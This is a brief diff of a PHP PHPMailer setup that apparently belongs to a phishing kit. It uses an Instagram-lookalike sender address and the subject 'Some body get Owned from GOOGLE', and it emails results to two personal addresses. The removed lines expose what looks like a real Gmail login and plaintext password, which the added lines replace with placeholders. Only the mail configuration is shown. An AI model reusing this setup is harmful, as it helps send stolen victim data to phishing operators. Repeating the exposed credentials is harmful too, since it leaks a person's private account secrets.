@@ -14,11 +14,11 @@ $mail->Host = "smtp.gmail.com";
 $mail->Port = 587; 
 $mail->SMTPSecure = 'tls';
 $mail->SMTPAuth = true;
-$mail->Username = 'secure.ins1agram@gmail.com';
-$mail->Password = '4510aditya';
-$mail->setFrom('secure.ins1agram@gmail.com', 'Friday');
-$mail->addAddress('aditya.pup2@gmail.com', 'Mr. Aditya');
-$mail->addAddress('saurav.pup2@gmail.com', 'Mr. Saurav');
+$mail->Username = 'fromxyz@gmail.com';
+$mail->Password = 'password';
+$mail->setFrom('fromxyz@gmail.com', 'Friday');
+$mail->addAddress('toxyz@gmail.com', 'Mr. xyz');
+$mail->addAddress('toxyz@gmail.com', 'Mr. xyz');
 $mail->Subject = 'Some body get Owned from GOOGLE';
 $mail->msgHTML("Hello here is a surprise for you"); // message to send ,
 $mail->AltBody = 'HTML messaging not supported'; // If html emails is not supported by the receiver, show this body
